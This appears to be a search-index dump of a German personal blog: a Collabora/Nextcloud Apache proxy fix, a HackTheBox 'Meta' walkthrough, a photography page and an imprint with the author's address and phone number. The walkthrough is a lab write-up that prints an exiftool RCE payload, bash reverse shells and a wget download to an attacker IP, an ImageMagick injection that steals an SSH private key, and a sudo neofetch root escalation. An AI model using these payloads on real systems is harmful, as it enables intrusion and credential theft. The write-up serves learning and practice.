[{"categories":null,"contents":" Einleitung Mit dem Update auf die derzeit aktuelle Nextcloud-Version 23 wurde Collabora Office als bevorzugte Office-Lösung der Cloud eingeführt1.\nFehlerbeschreibung Ich nutze Nextcloud in einem Docker-Setup. Collabora wird in einem eigenen Docker-Container betrieben. Auf dem Host-System läuft Apache 2 als Reverse Proxy, der die Verbindungen an die einzelnen Docker-Container weiterleitet.\nMit dem Update auf die neuste Collabora-Version zusammen mit Nextcloud 23 konnte der Collabora-Server nicht mehr gefunden werden. Somit war eine Bearbeitung von Dokumenten in der Nextcloud nicht mehr möglich. Stattdessen vermeldete Collabora, dass Dokumente nicht geöffnet werden könnten.\nDie Lösung Es stellte sich nach kurzer Recherche heraus, dass sich mit dem Update von Collabora einige Ordnerpfade geändert haben2. Meine Apache 2-Konfiguration hatte noch die alten Ordner-Pfade enthalten.\nDie korrigierte Fassung der Konfigurationsdatei unter /etc/apache2/sites-enabled/011-collabora.conf sieht wie folgt aus:\n\u0026lt;VirtualHost *:80\u0026gt; ServerName office.domain.de ErrorLog ${APACHE_LOG_DIR}/error.log CustomLog ${APACHE_LOG_DIR}/access.log combined AllowEncodedSlashes NoDecode SSLProxyEngine On SSLProxyVerify None SSLProxyCheckPeerCN Off SSLProxyCheckPeerName Off ProxyPreserveHost On # static html, js, images, etc. served from coolwsd # browser is the client part of Collabora Online ProxyPass /browser https://127.0.0.1:9980/browser retry=0 ProxyPassReverse /browser https://127.0.0.1:9980/browser # WOPI discovery URL ProxyPass /hosting/discovery https://127.0.0.1:9980/hosting/discovery retry=0 ProxyPassReverse /hosting/discovery https://127.0.0.1:9980/hosting/discovery # Capabilities ProxyPass /hosting/capabilities https://127.0.0.1:9980/hosting/capabilities retry=0 ProxyPassReverse /hosting/capabilities https://127.0.0.1:9980/hosting/capabilities # Main websocket ProxyPassMatch \u0026#34;/cool/(.*)/ws$\u0026#34; wss://127.0.0.1:9980/cool/$1/ws nocanon # Admin Console websocket ProxyPass /cool/adminws wss://127.0.0.1:9980/cool/adminws # Download as, Fullscreen presentation and Image upload operations ProxyPass /cool https://127.0.0.1:9980/cool ProxyPassReverse /cool https://127.0.0.1:9980/cool # Compatibility with integrations that use the /lool/convert-to endpoint ProxyPass /lool https://127.0.0.1:9980/cool ProxyPassReverse /lool https://127.0.0.1:9980/cool RewriteEngine on RewriteCond %{SERVER_NAME} =office.domain.de RewriteRule ^ https://%{SERVER_NAME}%{REQUEST_URI} [END,NE,R=permanent] \u0026lt;/VirtualHost\u0026gt; \u0026lt;VirtualHost *:443\u0026gt; ServerName office.domain.de ErrorLog ${APACHE_LOG_DIR}/error.log CustomLog ${APACHE_LOG_DIR}/access.log combined SSLEngine on AllowEncodedSlashes NoDecode SSLProxyEngine On SSLProxyVerify None SSLProxyCheckPeerCN Off SSLProxyCheckPeerName Off ProxyPreserveHost On # static html, js, images, etc. served from coolwsd # browser is the client part of Collabora Online ProxyPass /browser https://127.0.0.1:9980/browser retry=0 ProxyPassReverse /browser https://127.0.0.1:9980/browser # WOPI discovery URL ProxyPass /hosting/discovery https://127.0.0.1:9980/hosting/discovery retry=0 ProxyPassReverse /hosting/discovery https://127.0.0.1:9980/hosting/discovery # Capabilities ProxyPass /hosting/capabilities https://127.0.0.1:9980/hosting/capabilities retry=0 ProxyPassReverse /hosting/capabilities https://127.0.0.1:9980/hosting/capabilities # Main websocket ProxyPassMatch \u0026#34;/cool/(.*)/ws$\u0026#34; wss://127.0.0.1:9980/cool/$1/ws nocanon # Admin Console websocket ProxyPass /cool/adminws wss://127.0.0.1:9980/cool/adminws # Download as, Fullscreen presentation and Image upload operations ProxyPass /cool https://127.0.0.1:9980/cool ProxyPassReverse /cool https://127.0.0.1:9980/cool # Compatibility with integrations that use the /lool/convert-to endpoint ProxyPass /lool https://127.0.0.1:9980/cool ProxyPassReverse /lool https://127.0.0.1:9980/cool Include /etc/letsencrypt/options-ssl-apache.conf SSLCertificateFile /etc/letsencrypt/live/cloud.domain.de/fullchain.pem SSLCertificateKeyFile /etc/letsencrypt/live/cloud.domain.de/privkey.pem \u0026lt;/VirtualHost\u0026gt; Diese Problemlösung habe ich ebenfalls in das Nextcloud-Forum gepostet3. Dort gibt es eine exzellente Anleitung über die Einrichtung von Nextcloud in Docker.\nNextcloud Hub II brings major overhaul, introducing Nextcloud Office, P2P backup, more\u0026#160;\u0026#x21a9;\u0026#xfe0e;\nCollabora Documentation: Proxy settings\u0026#160;\u0026#x21a9;\u0026#xfe0e;\nHowTo: Ubuntu + Docker + Nextcloud + Talk + Collabora\u0026#160;\u0026#x21a9;\u0026#xfe0e;\n","date":"Jan 25","permalink":"http://localhost:1313/posts/nextcloud-23-collabora-nach-update-wieder-lauffaehig-bekommen/","tags":["tech"],"title":"Nextcloud 23 (Docker + Apache 2): Collabora nach Update wieder lauffähig bekommen"},{"categories":null,"contents":" Einleitung Meta ist eine als Medium eingestufte Maschine auf HackTheBox. Sie wurde Ende Januar 2022 veröffentlicht. Um die Maschine zu hacken ist es notwendig eine Schwachstelle in exiftool auszunutzen. Anschließend muss eine Schwachstelle des Moduls Mogrify aus der ImageMagick-Werkzeugsammlung ausgenutzt werden, um nach der ersten Shell den nächsten Benutzeraccount zu übernehmen. Als letzter Schritt wird eine Schwachstelle der Konfiguration von sudo und neofetech ausgenutzt, um Root-Zugang zu erhalten.\nDieser Artikel beschreibt die Lösung der Maschine und damit gilt: Spoileralarm!\nInitiale Erkundung Zunächst wird das System mithilfe von nmap gescannt. Um den Prozess zu vereinfachen, nutze ich dafür mein Skript mit dem Namen fast-nmap1.\nStarting Nmap 7.92 ( https://nmap.org ) at 2022-01-23 14:57 CET Nmap scan report for 10.129.140.80 Host is up (0.026s latency). PORT STATE SERVICE VERSION 22/tcp open ssh OpenSSH 7.9p1 Debian 10+deb10u2 (protocol 2.0) | ssh-hostkey: | 2048 12:81:17:5a:5a:c9:c6:00:db:f0:ed:93:64:fd:1e:08 (RSA) | 256 b5:e5:59:53:00:18:96:a6:f8:42:d8:c7:fb:13:20:49 (ECDSA) |_ 256 05:e9:df:71:b5:9f:25:03:6b:d0:46:8d:05:45:44:20 (ED25519) 80/tcp open http Apache httpd |_http-title: Did not follow redirect to http://artcorp.htb |_http-server-header: Apache Warning: OSScan results may be unreliable because we could not find at least 1 open and 1 closed port Aggressive OS guesses: Linux 4.15 - 5.6 (95%), Linux 5.0 (94%), Linux 5.4 (94%), Linux 5.0 - 5.4 (94%), Linux 5.3 - 5.4 (94%), Linux 3.1 (94%), Linux 3.2 (94%), AXIS 210A or 211 Network Camera (Linux 2.6.17) (94%), Linux 2.6.32 (94%), Linux 5.0 - 5.3 (94%) No exact OS matches for host (test conditions non-ideal). Network Distance: 2 hops Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel TRACEROUTE (using port 443/tcp) HOP RTT ADDRESS 1 25.91 ms 10.10.14.1 2 25.95 ms 10.129.140.80 OS and Service detection performed. Please report any incorrect results at https://nmap.org/submit/ . Nmap done: 1 IP address (1 host up) scanned in 37.68 seconds Es sind zwei Ports geöffnet: 22 (OpenSSH) und 80 (Apache Webserver). Üblicherweise gibt es in OpenSSH wenig zu holen, weshalb ein weiterer Blick auf den Webserver lohnt.\nNmap zeigt insbesondere eine Weiterleitung auf http://artcorp.htb/. Dies muss dann in der /etc/hosts-Datei ergänzt werden.\nWebserver: artcorp.htb Die Seite an sich sieht unspektakulär aus. Es scheint sich bei ArtCorp um eine Firma zu handeln, die Software entwickelt. Insbesondere wird gerade das Werkzeug MetaView entwickelt, ist aber nirgends auf der Seite aufzufinden. Vielleicht gibt es einen Entwicklungs-Server?\nWebserver: Weitere virtuelle Hosts finden Um weitere virtuelle Hosts zu finden, können verschiedene Tools eingesetzt werden, u. a. FFuF und gobuster. Beide Wege führen zum Ziel!\nDie folgenden Code-Zeilen zeigen beide Wege auf.\nffuf -w /usr/share/seclists/Discovery/DNS/subdomains-top1million-110000.txt -u https://artcorp.htb -H \u0026#34;Host: FUZZ.artcorp.htb\u0026#34; -t 200 -fl 10 -mc 200 gobuster vhost -u http://artcorp.htb -w /usr/share/seclists/Discovery/DNS/subdomains-top1million-110000.txt Ergebnis des Scans: Es gibt einen weiteren virtuellen Host auf dem Webserver: dev01.artcorp.htb. Dies muss in der /etc/hosts-Datei vermerkt werden und anschließend kann die Seite im Internetbrowser aufgerufen werden.\nWebserver: dev01.artcorp.htb Hinter der neu entdeckten Subdomain verbirgt sich die aktuelle Entwickler-Version von MetaView.\nNach kurzem Test entpuppt sich die Funktionsfähigkeit wie folgt: Der Benutzer lädt ein Bild Über das Webformular hoch und MetaView liest die Exit-Daten des Bildes aus und gibt diese auf dem Bildschirm aus. Die Ausgabe gleicht der Ausgabe von exiftool2.\nExiftool Remote Code Execution Eine kurze Recherche ergibt, dass es eine RCE-Schwachstelle in exiftool gibt3. Die Schwachstelle hat die Nummer CVE-2021-222044 erhalten. Ein Angreifer kann Schadende in einer Bild-Datei verstecken und ausführen. Der verlinkte Artikel beinhaltet eine Schritt-für-Schritt Anleitung mit Proof-of-Concept.\nProof-of-Concept Um zu verifizieren, dass der Server diese Schwachstelle besitzt, werden die folgenden Befehle ausgeführt. Der Schad-Code wird in dem Bild mit dem Namen meta.jpg versteckt.\necho (metadata \u0026#34;\\c${system(\u0026#39;id\u0026#39;)};\u0026#34;) \u0026gt; payload bzz payload payload.bzz djvumake exploit.djvu INFO=\u0026#39;1,1\u0026#39; BGjp=/dev/null ANTz=payload.bzz exiftool -config configfile \u0026#39;-HasselbladExif\u0026lt;=exploit.djvu\u0026#39; meta.jpg Die configfile hat den folgenden Inhalt:\n%Image::ExifTool::UserDefined = ( # All EXIF tags are added to the Main table, and WriteGroup is used to # specify where the tag is written (default is ExifIFD if not specified): \u0026#39;Image::ExifTool::Exif::Main\u0026#39; =\u0026gt; { # Example 1. EXIF:NewEXIFTag 0xc51b =\u0026gt; { Name =\u0026gt; \u0026#39;HasselbladExif\u0026#39;, Writable =\u0026gt; \u0026#39;string\u0026#39;, WriteGroup =\u0026gt; \u0026#39;IFD0\u0026#39;, }, # add more user-defined EXIF tags here... }, ); 1; #end% Anschließend wird das Bild hochgeladen und die Ausgabe auf der Seite kontrolliert: Es hat funktioniert!\nExploit-Skript Um die Ausnutzung des Exploits einfacher zu gestalten, habe ich ein kurzes Bash-Skript geschrieben, das die Erstellung eines mit Schad-Code behafteten Bildes teil-automatisiert.\n#!/bin/bash echo \u0026#34;Creating Exploit\u0026#34; bzz payload payload.bzz djvumake exploit.djvu INFO=\u0026#39;1,1\u0026#39; BGjp=/dev/null ANTz=payload.bzz exiftool -config configfile \u0026#39;-HasselbladExif\u0026lt;=exploit.djvu\u0026#39; meta.jpg echo \u0026#34;Exploit Created. Tidying up...\u0026#34; rm exploit.djvu rm payload.bzz mv meta.jpg meta_exploit.jpg mv meta.jpg_original meta.jpg echo \u0026#34;Done\u0026#34; Die Datei payload kann einfach editiert werden. Anschließend wird das Skript ausgeführt, um den Schad-Code in das Bild einzufügen.\nReverse Shell als www-data Um eine stabile Reverse Shell zu erhalten, musste ich ein wenig herum probieren. Der Weg, der letztlich erfolgreich war, ist der Folgende.\nZunächst wird eine Datei mit dem Namen rev.sh erstellt, die den folgenden Inhalt hat:\nbash -i \u0026gt;\u0026amp; /dev/tcp/10.10.14.140/4444 0\u0026gt;\u0026amp;1 Anschließend wird die Datei auf den Server übertragen:\n(metadata \u0026#34;\\c${system(\u0026#39;wget -O /tmp/rev.sh http://10.10.14.140/rev.sh\u0026#39;)};\u0026#34;) Im letzten Schritt wird die hochgeladene Datei auf dem Server ausgeführt, während ein netcat-Listener auf der Angreifer-Maschine läuft.\n(metadata \u0026#34;\\c${system(\u0026#39;bash /tmp/rev.sh\u0026#39;)};\u0026#34;) Das Ergebnis ist eine Reverse Shell als www-data.\nErkundung als www-data www-data hat leider keine Rechte, um auf interessante Informationen auf dem System zuzugreifen. Um die User-Flag zu erhalten, müssen die Rechte weiter ausgeweitet werden.\nEin Blick in die /etc/passwd` zeigt, dass es einen weiteren Benutzer namens Thomas auf dem System gibt. In dessen Home-Verzeichnis liegt die User-Flag.\nLaufende Prozesse und Cronjobs pspy645 zeigt nach einigen Minuten eine wiederkehrende Aufgabe an.\nDie wiederkehrende Aufgabe ruft mogrify auf und wandelt alle Dateien in /var/www/dev01.artcorp.htb/convert_images/ in .png-Dateien um.\nmogrify gehört zur ImageMagick-Bibliothek und die Version, die auf dem Server läuft, hat eine Shell Injection-Schwachstelle6. Mithilfe des Proof-of-Concept auf der verlinkten Seite kann der private SSH-Schlüssel des Benutzers Thomas ausgelesen werden.\nRechteausweitung auf thomas (ImageMagick-Exploit) Um Thomas\u0026rsquo; SSH-Schlüssel zu erhalten, muss eine Datei mit dem Namen poc.svg angelegt werden, die folgenden Inhalt hat:\n\u0026lt;image authenticate=\u0026#39;ff\u0026#34; `echo $(cat ~/.ssh/id_rsa)\u0026gt; /dev/shm/key`;\u0026#34;\u0026#39;\u0026gt; \u0026lt;read filename=\u0026#34;pdf:/etc/passwd\u0026#34;/\u0026gt; \u0026lt;get width=\u0026#34;base-width\u0026#34; height=\u0026#34;base-height\u0026#34; /\u0026gt; \u0026lt;resize geometry=\u0026#34;400x400\u0026#34; /\u0026gt; \u0026lt;write filename=\u0026#34;test.png\u0026#34; /\u0026gt; \u0026lt;svg width=\u0026#34;700\u0026#34; height=\u0026#34;700\u0026#34; xmlns=\u0026#34;http://www.w3.org/2000/svg\u0026#34; xmlns:xlink=\u0026#34;http://www.w3.org/1999/xlink\u0026#34;\u0026gt; \u0026lt;image xlink:href=\u0026#34;msl:poc.svg\u0026#34; height=\u0026#34;100\u0026#34; width=\u0026#34;100\u0026#34;/\u0026gt; \u0026lt;/svg\u0026gt; \u0026lt;/image\u0026gt; Diese wird anschließend in das Verzeichnis /var/www/dev01.artcorp.htb/convert_images/ kopiert. Sobald der Cron Job ausgeführt worden ist, ist Thomas\u0026rsquo; privater SSH-Schlüssel in der Datei /dev/shm/key abgespeichert und kann genutzt werden, um sich als Thomas auf dem System per SSH anzumelden und die User-Flag zu erhalten.\nRechteausweitung auf root Als erstes lohnt sich ein Blick auf die mit sudo ausführbaren Befehle.\nthomas@meta:~$ sudo -l Matching Defaults entries for thomas on meta: env_reset, mail_badpass, secure_path=/usr/local/sbin\\:/usr/local/bin\\:/usr/sbin\\:/usr/bin\\:/sbin\\:/bin, env_keep+=XDG_CONFIG_HOME User thomas may run the following commands on meta: (root) NOPASSWD: /usr/bin/neofetch \\\u0026#34;\\\u0026#34; In der Ausgabe sind zwei Punkte hervorzuheben:\nenv_keep+=XDG_CONFIG_HOME bewirkt, dass die Umgebungsvariable XDG_CONFIG_HOME erhalten bleibt, wenn sudo genutzt wird. (root) NOPASSWD: /usr/bin/neofetch \\\u0026quot;\\\u0026quot; bedeutet, dass neofetch als root-Benutzer ausgeführt werden kann, ohne dass ein Kennwort eingegeben werden muss. Beim Start von neofetch wird eine Konfigurationsdatei unter ~/.config/neofetch/config.conf benutzt. Das bedeutet, dass, wenn die Umgebungsvariable XDG_CONFIG_HOME auf das ~/.config-Verzeichnis zeigt, die neofetch-Konfiguration als root ausgeführt wird.\nUm eine Reverse Shell zu erhalten, wird die Datei ~/.config/neofetch/config.conf in der ersten Zeile wie folgt ergänzt:\nbash -i \u0026gt;\u0026amp; /dev/tcp/10.10.14.140/1337 0\u0026gt;\u0026amp;1 [Rest der Datei] Außerdem wird die Umgebungsvariable wie folgt festgelegt:\nexport XDG_CONFIG_HOME=\u0026#34;$HOME/.config\u0026#34; Netcat-Listener nicht vergessen und sudo /usr/bin/neofetch \\\u0026quot;\\\u0026quot; ausführen. Es sollte eine Reverse Shell als Root geöffnet werden, mit der die Root-Flag gelesen werden kann!\nZusammenfassung Die Maschine ist unter den als Medium eingestuften Maschinen eine der leichteren und zeigt wie wichtig eine penible Erkundung des Zielsystems ist. Die Reverse Shell zu erhalten war ein echter Kampf, da alle anderen Versuche (zig Möglichkeiten durchprobiert) nicht funktioniert haben. Die Privilege Escalation zum Benutzer root empfang ich als CTFig und nicht realistisch.\nAlles in allem eine gute und unterhaltsame Maschine und definitiv für Anfänger geeignet!\nhttps://github.com/xenophil90/shell-scripts/blob/main/fast-nmap.sh\u0026#160;\u0026#x21a9;\u0026#xfe0e;\nhttps://www.exiftool.org\u0026#160;\u0026#x21a9;\u0026#xfe0e;\nhttps://blog.convisoappsec.com/en/a-case-study-on-cve-2021-22204-exiftool-rce/\u0026#160;\u0026#x21a9;\u0026#xfe0e;\nhttps://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2021-22204\u0026#160;\u0026#x21a9;\u0026#xfe0e;\nhttps://github.com/DominicBreuker/pspy\u0026#160;\u0026#x21a9;\u0026#xfe0e;\nhttps://insert-script.blogspot.com/2020/11/imagemagick-shell-injection-via-pdf.html\u0026#160;\u0026#x21a9;\u0026#xfe0e;\n","date":"Jan 24","permalink":"http://localhost:1313/posts/htb-meta/","tags":["hackthebox","hacking"],"title":"HackTheBox: Meta"},{"categories":null,"contents":"","date":"Jan 01","permalink":"http://localhost:1313/beitraege/","tags":null,"title":"Beiträge"},{"categories":null,"contents":"Seit einigen Jahren widme ich mich mit großer Leidenschaft der Fotografie. Diese harmoniert wunderbar mit meiner anderen großen Begeisterung: dem Reisen. Wann immer ich aus dem Haus gehe, halte ich die Augen offen und suche nach besonderen Momenten, die sich in eindrucksvollen Bildern festhalten lassen. Im Laufe der Zeit ist so eine stetig wachsende Sammlung entstanden. Auf dieser Seite findet sich eine Übersicht meiner Arbeiten – und wer möchte, kann die Motive sogar kaufen.\nAfrikanische Tierwelt Willkommen in einer Welt voller Energie und Kontraste: Meine Galerie „Afrikanische Tierwelt“ entführt Sie in die unberührte Natur des afrikanischen Kontinents.\nDie Fotografien fangen berührende Momente und eindrucksvolle Szenen ein, die eine kraftvolle Atmosphäre schaffen und die Vielseitigkeit sowie die Anmut der afrikanischen Wildtiere widerspiegeln.\nLassen Sie sich von lebendigen Farben, faszinierenden Lichtspielen und einzigartigen Perspektiven verzaubern, während Sie Afrikas Wildnis hautnah erleben.\n\u0026raquo; Link zur Galerie im Shop\n","date":"Jan 01","permalink":"http://localhost:1313/fotografie/","tags":null,"title":"Fotografie"},{"categories":null,"contents":" Angaben gemäß § 5 TMG Phil Krämer\nFreiherr-vom-Stein Str. 2\n56410 Montabaur\nKontakt Telefon: +49 176 834 222 91\nE-Mail: phil.kraemer@outlook.de\nQuelle: eRecht24\n","date":"Jan 01","permalink":"http://localhost:1313/impressum/","tags":null,"title":"Impressum"}]